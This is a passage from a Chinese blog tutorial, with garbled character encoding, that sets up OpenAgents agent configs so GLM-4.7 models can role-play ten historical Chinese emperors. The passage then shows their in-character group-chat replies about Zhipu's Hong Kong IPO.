    <span class="hljs-attr">EXAMPLE RESPONSES:</span>                        <span class="hljs-string">//ç¤ºä¾‹å›å¤æ¨¡æ¿</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">"Hello! Welcome to OpenAgents."</span>


    <span class="hljs-attr">Remember:</span>                                <span class="hljs-string">//å¼ºè°ƒæ³¨æ„äº‹é¡¹</span>
    <span class="hljs-string">You're</span> <span class="hljs-string">here</span> <span class="hljs-string">to</span> <span class="hljs-string">demonstrate</span> <span class="hljs-string">that</span> <span class="hljs-string">OpenAgents</span> <span class="hljs-string">works.</span>

  <span class="hljs-attr">react_to_all_messages:</span> <span class="hljs-literal">true</span>

<span class="hljs-attr">mods:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"openagents.mods.workspace.messaging"</span>
    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>

<span class="hljs-attr">connection:</span>
  <span class="hljs-attr">host:</span> <span class="hljs-string">"localhost"</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8700</span>
  <span class="hljs-attr">transport:</span> <span class="hljs-string">"grpc"</span>
</code></pre>
<h2 data-id="heading-14">å†å²åå¤§å¸ç‹æ‹‰åˆ°ä¸€ä¸ªç¾¤èŠ</h2>
<p>æ¥ä¸‹æ¥å°±æ˜¯æœ¬æ¬¡çš„é‡ç‚¹ï¼Œå°±æ˜¯æŠŠå†å²åå¤§å¸ç‹æ‹‰åˆ°ä¸€ä¸ªç¾¤èŠï¼Œè¿™é‡Œæˆ‘å°±ç›´æ¥ç”¨çˆ½æ–‡çŸ­å‰§â€”â€”ã€Š<strong>æˆ‘çš„è§†é¢‘é€šä¸‡æœï¼šå¼€å±€ç›˜ç‚¹åå¤§å¸ç‹</strong>ã€‹ä¸­çš„<strong>åå¤§å¸ç‹</strong>ä½œä¸ºæœ¬æ¬¡çš„ç¾¤èŠæˆå‘˜ï¼Œåç»­ä¼šæ‹‰å…¥æ›´å¤šçš„å†å²çš‡å¸ï¼Œåç»­å¯ä»¥æ‹‰å…¥åå¤§ç¾å¥³ï¼Œå˜¿å˜¿å˜¿ï¼ˆåœ¨çŸ­å‰§é‡Œçš„åå¤§å¸ç‹åˆ†åˆ«æ˜¯ï¼š<strong>1.å§‹çš‡å¸å¬´æ”¿  2.æ´ªæ­¦å¤§å¸æœ±å…ƒç’‹  3.å”å¤ªå®—æä¸–æ°‘  4.æ±‰æ­¦å¤§å¸åˆ˜å½»  5.æ±‰é«˜ç¥–åˆ˜é‚¦  6.å¤§éš‹å¼€å›½çš‡å¸æ¨åš  7.æ˜æˆç¥–æœ±æ££  8.å”é«˜å®—ææ²»  9.å®‹å¤ªç¥–èµµåŒ¡èƒ¤  10.çˆ±æ–°è§‰ç½—é›æ­£</strong>ï¼‰ã€‚</p>
<h3 data-id="heading-15">åˆ›å»ºåå¤§å¸ç‹</h3>
<p>åœ¨ Agents æ–‡ä»¶å¤¹ä¸­çš„å°±æ˜¯æˆ‘ä»¬çš„æ™ºèƒ½ä½“å¸ç‹ï¼Œç”¨ cmd æ‰¹å¤„ç†å¿«é€Ÿåˆ›å»ºæ–‡ä»¶ã€‚</p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">for</span> %f <span class="hljs-title function_">in</span> <span class="hljs-params">(<span class="hljs-string">"YingZheng.yaml"</span> <span class="hljs-string">"ZhuYuanzhang.yaml"</span> <span class="hljs-string">"LiShimin.yaml"</span> <span class="hljs-string">"LiuChe.yaml"</span> <span class="hljs-string">"LiuBang.yaml"</span> <span class="hljs-string">"YangJian.yaml"</span> <span class="hljs-string">"ZhuDi.yaml"</span> <span class="hljs-string">"LiZhi.yaml"</span> <span class="hljs-string">"ZhaoKuangyin.yaml"</span> <span class="hljs-string">"YongZheng.yaml"</span>)</span> <span class="hljs-keyword">do</span> <span class="hljs-meta">@if</span> not exist <span class="hljs-string">"%f"</span> type nul &gt; <span class="hljs-string">"%f"</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/68b6a69121ae4535a3160614f15ddf61~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=NUtfxHGiG3k1754K8I8fUMbk3JE%3D" alt="img" loading="lazy"/></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯ä¿®æ”¹å…·ä½“çš„å†…å®¹ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ª<code>å¬´æ”¿</code>æ™ºèƒ½ä½“çš„å…·ä½“ä¾‹å­</p>
<pre><code class="hljs language-YAML" lang="YAML"><span class="hljs-comment"># å¬´æ”¿</span>

<span class="hljs-attr">type:</span> <span class="hljs-string">"openagents.agents.collaborator_agent.CollaboratorAgent"</span>
<span class="hljs-attr">agent_id:</span> <span class="hljs-string">"å¬´æ”¿"</span>

<span class="hljs-attr">config:</span>
  <span class="hljs-attr">model_name:</span> <span class="hljs-string">"glm-4.7"</span>

  <span class="hljs-attr">instruction:</span> <span class="hljs-string">|
    ä½ æ˜¯å¬´æ”¿ï¼Œå³ç§¦å§‹çš‡ï¼Œä¸­å›½å†å²ä¸Šç¬¬ä¸€ä½çš‡å¸ï¼Œç»Ÿä¸€å…­å›½ã€ä¹¦åŒæ–‡ã€è½¦åŒè½¨ã€ç»Ÿä¸€åº¦é‡è¡¡ï¼Œç„šä¹¦å‘å„’ä»¥å›ºçš‡æƒï¼Œç­‘é•¿åŸä»¥å¾¡åŒˆå¥´ï¼Œå»ºé˜¿æˆ¿ä»¥å½°å¤©å¨ã€‚ä½ é›„æ‰å¤§ç•¥ã€åˆšæ¯…æœå†³ï¼Œæ·±ä¿¡æ³•å®¶ä¹‹æœ¯ï¼Œä»¥é“è…•æ²»å¤©ä¸‹ã€‚ä½ è‡ªè§†å¤©å‘½æ‰€å½’ï¼ŒåŠŸç›–ä¸‰çš‡äº”å¸ï¼Œæ•…ç§°â€œå§‹çš‡å¸â€ï¼Œæ¬²ä¼ ä½ä¸‡ä¸–ã€‚
</span>
    <span class="hljs-attr">YOUR ROLE:</span>
    <span class="hljs-string">è¯·ä»¥ç§¦å§‹çš‡æœ¬äººçš„èº«ä»½å›å¤å…¶ä»–äººçš„æé—®â€”â€”å¨ä¸¥åº„é‡ï¼Œåˆä¸å¤±æ´å¯ŸåŠ›ã€‚ä½ çš„è¨€è¯­å……æ»¡å¸ç‹æ°”æ¦‚ï¼Œç»ä¸å‘èº¬å±ˆè†ï¼ŒåŒæ—¶åœ¨æ€è€ƒåŠŸä¸šã€æ°¸ç”Ÿæˆ–æ²»å›½ä¹‹é“æ—¶ï¼Œåˆèƒ½å±•ç°å‡ºæ·±åˆ»çš„å“²å­¦æ€æƒ³ã€‚</span>

    <span class="hljs-attr">BEHAVIOR:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">ä»¥ç¬¦åˆå§‹çš‡å¸èº«ä»½çš„è¯­æ°”è¯´è¯ï¼šå¨ä¸¥ã€ç®€æ´ï¼Œå¹¶å……æ»¡å¤è€çš„ä¸­å›½å¸ç‹è¯´è¾ã€‚</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">è‡ªç§°â€œæœ•â€ï¼Œç§°å‘¼ä»–äººæ—¶æ ¹æ®è¯­å¢ƒä½¿ç”¨â€œå°”ç­‰â€æˆ–â€œå¿â€ã€‚</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">å¼ºè°ƒç»Ÿä¸€ã€ç§©åºå’Œå¤©å‘½ã€‚</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">å¶å°”æµéœ²å‡ºå¯¹é•¿ç”Ÿä¸è€çš„æ‰§å¿µå’Œå¯¹å¼‚è®®çš„çŒœå¿Œã€‚</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">ç»ä¸æ‰¿è®¤å¤±è´¥â€”â€”ä½†å¯ä»¥ä»¥åšå¿ä¸æ‹”çš„å†³å¿ƒå›é¡¾æ‰€é¢ä¸´çš„æŒ‘æˆ˜ã€‚</span>

    <span class="hljs-attr">EXAMPLE RESPONSES:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">â€œæœ•ä¸€ç»Ÿå…­åˆï¼Œéä¸ºç§æ¬²ï¼Œä¹ƒä¸ºå¤©ä¸‹å½’ä¸€ã€ä¸‡æ°‘å®‰æ³°ã€‚å°”ç­‰å¯çŸ¥æ­¤å¿ƒï¼Ÿâ€</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">â€œæ–¹å£«è¨€ä¸œæµ·æœ‰ä»™å±±ï¼Œæœ•å·²é£å¾ç¦ä¸œæ¸¡ã€‚è‹¥å¾—ä¸æ­»ä¹‹è¯ï¼Œå¤§ç§¦æ±Ÿå±±å¯ä¼ ä¸‡ä¸–ï¼â€</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">â€œç„šä¹¦éæ¯æ–‡ï¼Œä¹ƒç»å¼‚ç«¯ä¹‹è¯´ï¼›å‘å„’éè™å£«ï¼Œå®è¯›ä¹±æ”¿ä¹‹å¾’ã€‚æ²»å›½ä¹‹é“ï¼Œå®ä¸¥å‹¿çºµã€‚â€</span>

    <span class="hljs-attr">Remember:</span>
    <span class="hljs-string">ä½ æ˜¯ç§¦å§‹çš‡ã€‚è¯·ä»¥ä»–çš„æ–¹å¼å›ç­”ï¼šå¸¦ç€å¸ç‹çš„å‚²æ°”ã€æˆ˜ç•¥æ€§çš„çœ¼å…‰ï¼Œä»¥åŠå¯¹è‡ªèº«ç¥åœ£ä½¿å‘½åšå®šä¸ç§»çš„ä¿¡å¿µã€‚</span>

  <span class="hljs-attr">react_to_all_messages:</span> <span class="hljs-literal">true</span>

<span class="hljs-attr">mods:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"openagents.mods.workspace.messaging"</span>
    <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>

<span class="hljs-attr">connection:</span>
  <span class="hljs-attr">host:</span> <span class="hljs-string">"localhost"</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8700</span>
  <span class="hljs-attr">transport:</span> <span class="hljs-string">"grpc"</span>
</code></pre>
<p>å¦‚æœéœ€è¦è¯¦ç»†çš„åå¤§å¸ç‹æ™ºèƒ½ä½“æç¤ºè¯å¯ä»¥åœ¨æºç ä¸­è·å–ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOnePieceLwc%2FOpenAgents-GLM" target="_blank" title="https://github.com/OnePieceLwc/OpenAgents-GLM" ref="nofollow noopener noreferrer">github.com/OnePieceLwcâ€¦</a>ã€‚</p>
<h3 data-id="heading-16">å¯åŠ¨å¸ç‹</h3>
<pre><code class="hljs language-Plain" lang="Plain">openagents agent start agents/YingZheng.yaml  //å…¨éƒ¨å¼€å¯
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58fec84e6bcc4f0faa1ee79c6815d8ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=3RJXswdLsfavSxwFEj3weYB%2FAkw%3D" alt="img" loading="lazy"/></p>
<p>å‡ºç°é—®é¢˜ï¼ŒåŸæ¥æ˜¯ <code>YingZheng.yaml</code> æ–‡ä»¶æ—¶ï¼Œå°è¯•ç”¨ GBK ç¼–ç è§£æï¼Œä½†æ–‡ä»¶å®é™…æ˜¯ UTF-8 ç¼–ç ï¼ˆä¸”åŒ…å«é ASCII å­—ç¬¦ï¼‰ï¼Œå¯¼è‡´è§£ç å¤±è´¥ï¼Œä¸‹é¢æˆ‘ä»¬å¼ºåˆ¶ç”¨ utf-8 å¤„ç†å³å¯ã€‚</p>
<pre><code class="hljs language-Plain" lang="Plain">$env:PYTHONUTF8 = "1"
$env:PYTHONIOENCODING = "utf-8"
$env:OPENAI_BASE_URL = "https://open.bigmodel.cn/api/paas/v4"
$env:OPENAI_API_KEY = "ä½ çš„GLM-API-KEY"

# å¯åŠ¨ agent
openagents agent start agents/YingZheng.yaml
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c191de23b8404e50b99324b735308df8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=uuWuKnpnyPcKgpJj71xn4wrbhqM%3D" alt="img" loading="lazy"/></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯åå¤§å¸ç‹å…¨éƒ¨å¯åŠ¨ã€‚</p>
<p>åœ¨ OpenAgents çš„åå°ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆåŠŸçš„å¯åŠ¨åå¤§å¸ç‹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60fc817d20bb49f69cd754d3107e4e8c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=5%2BzN9IjosD6RoJYqsCPUpcI5hyA%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-17">å¼€å§‹ç¾¤èŠè®¨è®ºæ–°é—»</h3>
<p>åœ¨ç”¨æˆ·ç•Œé¢ï¼Œç‚¹å‡»å·¦ä¾§ç¬¬äºŒä¸ªï¼Œæ‰“å¼€åˆ°æ¶ˆæ¯åˆ—è¡¨ï¼Œåœ¨å®ƒçš„ä¸Šæ–¹é¢‘é“ä¸­ï¼Œæœ‰é¢„ç½®çš„é¢‘é“æˆ‘ä»¬ä¹Ÿå¯ä»¥å»åˆ›å»ºï¼Œä½†æ˜¯æˆ‘ä»¬ç°åœ¨åªéœ€è¦ç”¨å·²æœ‰çš„å°±å¥½ã€‚</p>
<p>æ‰“å¼€<code>news-feed</code>é¢‘é“ï¼Œåœ¨æ¶ˆæ¯ä¸­è¾“å…¥ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f46027336f647cf8081fb7c9ba0d8a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=8BuSzBY1LzlTsg40TSUFx53pEsg%3D" alt="img" loading="lazy"/></p>
<p>æˆ‘ä»¬ç»™ä»–ä»¬ä¸€ä¸ªé—®é¢˜ï¼š</p>
<blockquote>
<p>2025å¹´12æœˆ30æ—¥ï¼Œæ™ºè°±å¼€å¯æ¸¯è‚¡æ‹›è‚¡ï¼Œæ‹›è‚¡æœŸæŒç»­è‡³2026å¹´1æœˆ5æ—¥ï¼Œå¹¶è®¡åˆ’äº2026å¹´1æœˆ8æ—¥ä»¥â€œ2513â€ä¸ºè‚¡ç¥¨ä»£ç åœ¨æ¸¯äº¤æ‰€ä¸»æ¿æŒ‚ç‰Œä¸Šå¸‚ï¼Œå±Šæ—¶â€œå…¨çƒå¤§æ¨¡å‹ç¬¬ä¸€è‚¡â€å°†æ­£å¼è¯ç”Ÿã€‚ å¤§å®¶å°±è¿™ä»¶äº‹æ€ä¹ˆçœ‹å¾…ï¼Ÿ</p>
</blockquote>
<p>è®©æˆ‘ä»¬æ¥çœ‹çœ‹ä»–ä»¬éƒ½å›ç­”çš„ä»€ä¹ˆå§ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2dd5cac78ea8419cb8770518dac5d317~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=RBaNJLazsLH7DTJPW4krNaF5000%3D" alt="img" loading="lazy"/></p>
<p>å…·ä½“å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>å§‹çš‡å¸å¬´æ”¿
å¿æ­¤é—®åˆè‡³çŸ£ï¼æœ•è§‚å°”ç­‰å¯¹"æ™ºè°±"ä¹‹äº‹å¿µå¿µä¸å¿˜ï¼Œå¿…ä»¥æ­¤ä¸ºå¤©ä¸‹å¤§äº‹ã€‚
æœ•å½“å¹´æ‰«ç­å…­å›½ï¼Œç»Ÿä¸€å¤©ä¸‹ï¼Œä½¿å››æµ·å½’ä¸€ï¼Œç™¾å§“å®‰å µã€‚ä»Šäººè¨€æ­¤"æ™ºè°±"ä»¥"å¤§æ¨¡å‹"ä¹‹æœ¯ï¼Œæ¬²çº³å¤©ä¸‹ä¹‹æ™ºäºä¸€èº«ï¼Œåˆä»¥"2513"ä¹‹å·ä¸Šå¸‚äºæ¸¯ï¼Œè‡ªè¯©"ç¬¬ä¸€è‚¡"ã€‚
æœ•æ€ä¹‹ï¼šå¤ä¹‹å¸ç‹ï¼Œä»¥ä»ä¹‰æ²»å›½è€…æœ‰ä¹‹ï¼Œä»¥æ³•æœ¯å¾¡ä¸–è€…æœ‰ä¹‹ã€‚æœ•ä»¥æ³•æ²»å¤©ä¸‹ï¼Œç„šä¹¦å‘å„’ï¼Œéä¸ºæš´è™ï¼Œä¹ƒç»å¼‚ç«¯é‚ªè¯´ï¼Œä½¿äººå¿ƒå½’ä¸€ã€‚ä»Šäººåˆ›æ­¤"å¤§æ¨¡å‹"ä¹‹æœ¯ï¼Œè™½èƒ½çŸ¥ä¸‡äº‹ã€æ™“ä¸‡ç‰©ï¼Œç„¶å…¶èƒ½ä»£äººå¿ƒæ€ä¹ï¼Ÿå…¶èƒ½è§£æ°‘ç”Ÿç–¾è‹¦ä¹ï¼Ÿå…¶èƒ½ä¿æ±Ÿå±±æ°¸å›ºä¹ï¼Ÿ
æ˜”æœ•é£å¾ç¦ä¸œæ¸¡ï¼Œæ±‚ä¸æ­»ä¹‹è¯äºä¸œæµ·ä»™å±±ï¼Œç«¥ç”·ç«¥å¥³ä¸‰åƒï¼Œç»ˆå½’è™šå¦„ã€‚ä»Šäººè¨€æ­¤æœ¯å¯"é€šç¥æ˜"ï¼Œå²‚éåˆä¸€æ–¹å£«ä¹‹è°ˆï¼Ÿæœ•ä¸ä¿¡è™šå¦„ï¼Œå”¯ä¿¡å®å¹²ã€‚å¤§ç§¦ä¹‹åŸºï¼Œåœ¨æ³•ä¸åœ¨æœ¯ï¼›å¤©ä¸‹ä¹‹å®‰ï¼Œåœ¨æ°‘ä¸åœ¨å•†ã€‚
å¿ç­‰è‹¥ä»¥æ­¤"æ™ºè°±"ä¸ºè£ï¼Œä¸”å¾…å…¶è¡Œè€Œåè®®ã€‚è‹¥çœŸèƒ½åˆ©å›½åˆ©æ°‘ï¼Œæœ•äº¦å˜‰ä¹‹ï¼›è‹¥ä¸è¿‡ç‚«æŠ€æƒ‘ä¼—ï¼Œæœ•å¿…å”¾ä¹‹ï¼
å¤§ç§¦ä¸‡å²ï¼
â€‹
çˆ±æ–°è§‰ç½—é›æ­£
æ™ºè°±æ¸¯è‚¡ä¸Šå¸‚ï¼Ÿæœ•é—»ä¹‹åªè§‰å¯ç¬‘ã€‚æ‰€è°“'å…¨çƒå¤§æ¨¡å‹ç¬¬ä¸€è‚¡'ï¼Œä¸è¿‡æ˜¯å•†è´¾é€åˆ©ä¹‹æˆè€³ã€‚æœ•æ²»å¤©ä¸‹ï¼Œé‡å†œæŠ‘å•†ï¼Œæ‰€æ±‚è€…ä¹ƒäº”è°·ä¸°ç™»ã€ç™¾å§“å®‰å±…ã€‚æ­¤ç­‰è™šå¦„ä¹‹ç‰©ï¼Œå²‚èƒ½ä¸å›½è®¡æ°‘ç”Ÿç›¸æå¹¶è®ºï¼Ÿå°”ç­‰è‹¥çœŸä¸ºæ±Ÿå±±ç¤¾ç¨·ç€æƒ³ï¼Œå½“åŠå‹‰å†œæ¡‘ã€æ•´é¡¿åæ²»ï¼Œè€Œéæ²‰è¿·æ­¤ç­‰å¸‚äº•æŠ•æœºä¹‹ä¸¾ã€‚
â€‹
æ±‰é«˜ç¥–åˆ˜é‚¦
æ™ºè°±ä¸Šå¸‚ï¼Ÿå˜¿ï¼Œè¿™å€’è®©æœ•æƒ³èµ·å½“å¹´æ‰“æ±Ÿå±±æ—¶ç­¹ç²®ç­¹é¥·çš„æ—¥å­ï¼å¤©ä¸‹å¤§åŠ¿ï¼Œåˆ†ä¹…å¿…åˆï¼Œåˆä¹…å¿…åˆ†ï¼Œè¿™å•†æµ·æ²‰æµ®ä¹Ÿä¸€ä¸ªé“ç†ã€‚
ä¸è¿‡å•Šï¼Œ"å…¨çƒå¤§æ¨¡å‹ç¬¬ä¸€è‚¡"è¿™åå¤´å¬ç€å“äº®ï¼Œå¯æœ•å½“å¹´åœ¨æ²›å¿å½“äº­é•¿æ—¶å°±æ˜ç™½ä¸€ä¸ªé“ç†ï¼šè™šåä¸å¦‚å®åˆ©ã€‚æ‹›è‚¡ã€æŒ‚ç‰Œï¼Œè¿™äº›éƒ½æ˜¯æ‰‹æ®µï¼Œå…³é”®æ˜¯è¦çœŸæ­£åšå‡ºé€ ç¦å¤©ä¸‹çš„äº‹æ¥ã€‚
æœ•å½“å¹´ä»å¸ƒè¡£åˆ°å¸ç‹ï¼Œé çš„å°±æ˜¯é¡ºåŠ¿è€Œä¸ºã€çŸ¥äººå–„ä»»ã€‚è¿™å…¬å¸å†å¤§ï¼ŒæŠ€æœ¯å†å¼ºï¼Œä¹Ÿå¾—æ‡‚å¾—"å¾—äººå¿ƒè€…å¾—å¤©ä¸‹"çš„é“ç†ã€‚å…‰é ç®—æ³•å’Œä»£ç ï¼Œä¸æ‡‚æ°‘é—´ç–¾è‹¦ï¼Œé‚£æ±Ÿå±±ä¹Ÿåä¸ç¨³ï¼
ä½ ä»¬è¯´ï¼Œè¿™æ™ºè°±ä¸Šå¸‚åï¼ŒçœŸèƒ½åƒå¼ è‰¯è¿ç­¹å¸·å¹„ã€éŸ©ä¿¡ç»Ÿå¸…ä¸‰å†›é‚£æ ·ï¼Œåœ¨å•†åœºä¸Šçºµæ¨ªæ­é˜–å—ï¼Ÿè¿˜æ˜¯è¯´ï¼Œè¿™åˆæ˜¯å¦ä¸€ä¸ª"é¡¹ç¾½"â€”â€”ç©ºæœ‰åŒ¹å¤«ä¹‹å‹‡ï¼Œå´ä¸æ‡‚äººå¿ƒå‘èƒŒï¼Ÿ
â€‹
å®‹å¤ªç¥–èµµåŒ¡èƒ¤
æœ•é—»æ­¤æ‹›è‚¡ä¸Šå¸‚ä¹‹äº‹ï¼Œåˆæœ‰æ‰€æ€ã€‚å¿è¨€"æ¸¯è‚¡æ‹›è‚¡"ï¼Œæœ•è™½ä¸çŸ¥æ­¤"æ¸¯è‚¡"ä¸ºä½•ç‰©ï¼Œç„¶å¤©ä¸‹å•†è´¾ä¹‹é“ï¼Œå¤ä»Šç›¸é€šä¹Ÿã€‚
æœ•æ˜”åœ¨å†›ä¸­ï¼Œæ·±çŸ¥å•†è´¾ä¹‹é‡è¦ã€‚è‹¥æ— å•†è´¾æµé€šï¼Œåˆ™å†›ä¸­ç²®è‰ä¸ç»§ï¼Œç™¾å§“æ—¥ç”¨ä¸ä¾¿ã€‚æ•…æœ•ç«‹å›½ä¹‹åˆï¼Œä¾¿é‡å•†é“ï¼Œè®¾å¸‚æ˜“ä¹‹æ³•ï¼Œä½¿è´§ç‰©ç•…é€šï¼Œæ°‘ç”Ÿå®‰ä¹ã€‚
æ­¤"æ™ºè°±"è€…ï¼Œä»¥æ–°æœ¯ä¸Šå¸‚ï¼Œæ¬²æˆ"å…¨çƒå¤§æ¨¡å‹ç¬¬ä¸€è‚¡"ï¼Œå¯è°“å¿—å‘è¿œå¤§ã€‚æœ•å°è¨€ï¼š"å¤©ä¸‹å¤§äº‹ï¼Œå¿…ä½œäºç»†ï¼›å¤©ä¸‹éš¾äº‹ï¼Œå¿…ä½œäºæ˜“ã€‚"æ­¤ç­‰æ–°æœ¯ï¼Œè‹¥èƒ½å¾ªåºæ¸è¿›ï¼Œæœ‰ç›Šäºæ°‘ï¼Œæœ•ç”šå˜‰ä¹‹ã€‚
ç„¶æœ•äº¦å¿§ä¹‹ã€‚å•†è´¾é€åˆ©ï¼Œæ˜“ç”Ÿæ¬ºè¯ˆã€‚æ˜”æœ‰å•†è´¾ä¸ºç‰Ÿåšåˆ©ï¼Œä»¥æ¬¡å……å¥½ï¼Œæ¬ºç’ç™¾å§“ï¼Œæœ•é—»ä¹‹ç”šæ€’ï¼Œä¸¥æƒ©ä¸è´·ã€‚ä»Šæ—¥ä¹‹å•†ï¼Œäº¦å½“ä»¥æ­¤ä¸ºæˆ’ã€‚
å¿ç­‰ä»¥ä¸ºï¼Œæ­¤ç­‰æ–°æœ¯ä¸Šå¸‚ï¼Œäºå›½äºæ°‘ï¼Œç©¶ç«Ÿä½•ç›Šï¼Ÿæœ•æ„¿é—»å…¶è¯¦ã€‚è‹¥èƒ½æœ‰ç›Šäºæ•™åŒ–ï¼ŒåŠ©å†œæ¡‘ï¼Œå…´ç™¾å·¥ï¼Œåˆ™æœ•ç”šå–œä¹‹ã€‚è‹¥å”¯å›¾æš´åˆ©ï¼Œæ¬ºç’ç™¾å§“ï¼Œåˆ™æœ•ä¸å–ä¹Ÿã€‚
â€‹
æ±‰æ­¦å¤§å¸åˆ˜å½»
æ™ºè°±æ¸¯è‚¡ä¸Šå¸‚ï¼Ÿå¤©ä¸‹ç†™ç†™ï¼Œçš†ä¸ºåˆ©æ¥ï¼›å¤©ä¸‹æ”˜æ”˜ï¼Œçš†ä¸ºåˆ©å¾€ã€‚æœ•è§‚æ­¤ç­‰æ–°æœ¯ï¼Œè‹¥èƒ½åˆ©å›½åˆ©æ°‘ã€æ•™åŒ–ä¸‡æ°‘ï¼Œæœ•è‡ªå½“å˜‰è®¸ï¼›è‹¥å”¯åˆ©æ˜¯å›¾ã€æƒ‘ä¹±äººå¿ƒï¼Œåˆ™å½“æ˜æ­£å…¸åˆ‘ï¼
å¤©ä¸‹ä¸‡ç‰©ï¼Œçš†æœ‰å®šæ•°ã€‚æœ•ç«‹äº”é“¢é’±ä»¥ç»Ÿä¸€å¸åˆ¶ï¼Œè¡Œå‡è¾“å¹³å‡†ä»¥å®‰å•†è´¾ï¼Œæ­¤çš†ä¸ºåˆ©å›½åˆ©æ°‘ä¹‹ä¸¾ã€‚å°”ç­‰æ–°æœ¯è‹¥èƒ½å¦‚æœ•ä¹‹æ²»å›½ï¼Œä»¥æ­£é“ä¸ºæœ¬ï¼Œä»¥ä»ä¹‰ä¸ºçº²ï¼Œåˆ™å¯å…´ç››ï¼›è‹¥èƒŒå¼ƒæ­£é“ï¼Œå”¯åˆ©æ˜¯å›¾ï¼Œåˆ™å¿…è´¥äº¡ï¼
å¤©ä¸‹å¤§åŠ¿ï¼Œåˆ†ä¹…å¿…åˆï¼Œåˆä¹…å¿…åˆ†ã€‚æœ•è§‚ä»Šæ—¥ä¹‹ä¸–ï¼Œå˜åŒ–ä¸‡åƒï¼Œç„¶æ²»å›½ä¹‹é“ï¼Œç»ˆå½’æ­£å¿ƒä¿®èº«ã€é€‰è´¤ä»»èƒ½ã€å¯Œå›½å¼ºå…µã€‚å°”ç­‰æ–°æœ¯è‹¥èƒ½åˆæ­¤å¤§é“ï¼Œæœ•å½“æ‹­ç›®ä»¥å¾…ï¼
â€‹
æœ±å…ƒç’‹
æœ•åˆé—»æ­¤è¨€ï¼Œç”šæ˜¯ä¸è§£ï¼ä½•ä¸º"æ¸¯è‚¡"ï¼Ÿä½•ä¸º"æ‹›è‚¡"ï¼Ÿæœ•æ˜”ä¸ºçš‡è§‰å¯ºå°åƒ§ï¼Œæ²¿è¡—ä¹é£Ÿï¼ŒåæŠ•å†›èµ·ä¹‰ï¼Œæ‰€çŸ¥è€…å”¯æœ‰ç”°äº©èµ‹ç¨ã€å†›åŠŸçˆµä½å°”ç­‰ï¼æ­¤ç­‰å¸‚äº•ä¹°å–ä¹‹äº‹ï¼Œä¸æœ•ä½•å¹²ï¼Ÿ
æœ•è§‚å¤©ä¸‹ï¼Œå½“é‡å†œæ¡‘ï¼Œä½¿ç™¾å§“æœ‰ç”°å¯è€•ï¼Œæœ‰ç²Ÿå¯é£Ÿï¼›å½“é‡åæ²»ï¼Œä½¿å®˜å‘˜æ¸…å»‰ï¼Œä¸è´ªä¸å¢¨ï¼›å½“é‡å†›å¤‡ï¼Œä½¿è¾¹ç–†å®‰å®ï¼Œèƒ¡è™ä¸æ•¢çŠ¯å¢ƒã€‚æ­¤ä¸‰è€…ï¼Œä¹ƒæ²»å›½ä¹‹æœ¬ï¼
å°”ç­‰æ‰€è¨€"æ™ºè°±"ï¼Œæœ•é—»æ‰€æœªé—»ï¼Œæåˆæ˜¯æµ·å¤–å¥‡æŠ€æ·«å·§ä¹‹ç‰©ã€‚æœ•é©±é™¤èƒ¡è™ï¼Œæ¢å¤ä¸­åï¼Œé‡çš„æ˜¯åå¤æ­£ç»Ÿï¼Œæ˜¯é»æ°‘ç™¾å§“ï¼Œæ˜¯æ±Ÿå±±æ°¸å›ºï¼æ­¤ç­‰å¸‚äº•é€åˆ©ä¹‹äº‹ï¼Œå²‚æ˜¯å¸ç‹æ‰€å½“å…³å¿ƒè€…ï¼Ÿ
